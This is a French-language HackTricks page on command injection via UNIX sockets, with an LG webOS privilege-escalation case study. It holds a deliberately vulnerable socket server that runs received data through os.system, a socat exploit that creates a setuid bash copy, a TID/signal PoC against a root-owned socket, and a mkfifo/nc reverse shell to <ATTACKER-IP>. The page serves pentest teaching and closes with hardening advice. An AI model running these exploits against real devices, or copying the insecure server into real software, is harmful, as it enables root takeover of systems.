# Injection de commande via socket

{{#include ../../banners/hacktricks-training.md}}

## Exemple de liaison de socket avec Python

Dans l'exemple suivant, un **socket Unix est créé** (`/tmp/socket_test.s`) et tout ce qui est **reçu** va être **exécuté** par `os.system`. Je sais que vous ne trouverez pas cela dans la nature, mais l'objectif de cet exemple est de voir à quoi ressemble un code utilisant des sockets Unix et comment gérer l'entrée dans le pire cas possible.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Exécutez** le code avec python : `python s.py` et **vérifiez comment le socket est en écoute** :
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Étude de cas : escalade déclenchée par un signal via un socket UNIX appartenant à root (LG webOS)

Certains daemons privilégiés exposent un socket UNIX appartenant à root qui accepte des entrées non fiables et associe des actions privilégiées à des identifiants de threads et à des signaux. Si le protocole permet à un client non privilégié d'influencer le thread natif ciblé, il peut être possible de déclencher un chemin de code privilégié et d'élever ses privilèges.<sup>[[1]](#references)[[2]](#references)</sup>

Le write-up principal et la disclosure décrivent la séquence suivante.<sup>[[1]](#references)[[2]](#references)</sup>

Pattern observé :
- Se connecter à un socket appartenant à root (par exemple, /tmp/remotelogger).
- Créer un thread et obtenir son identifiant de thread natif (TID).
- Envoyer le TID (packé) ainsi que du padding comme requête ; recevoir un accusé de réception.
- Envoyer un signal spécifique à ce TID pour déclencher le comportement privilégié.

Le PoC condensé ci-dessous reproduit cette séquence.<sup>[[1]](#references)[[2]](#references)</sup>
Esquisse de PoC minimale :
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Pour obtenir un shell root, un simple pattern named-pipe + nc peut être utilisé.<sup>[[2]](#references)</sup>
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Notes :
- Cette classe de bugs résulte du fait de faire confiance à des valeurs dérivées de l'état d'un client non privilégié (TIDs) et de les associer à des signal handlers ou à une logique privilégiés.<sup>[[1]](#references)</sup>
- Renforcez la sécurité en imposant l'authentification sur le socket, en validant les formats des messages et en découplant les opérations privilégiées des identifiants de thread fournis de l'extérieur.

## References

- [1] [Jailbreak webOS pour le plaisir (juste pour le plaisir)](https://ut.buglloc.com/2025/01/webos-jailbreak/)
- [2] [Path Traversal, Authentication Bypass et prise de contrôle complète d'un appareil LG WebOS TV (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
{{#include ../../banners/hacktricks-training.md}}
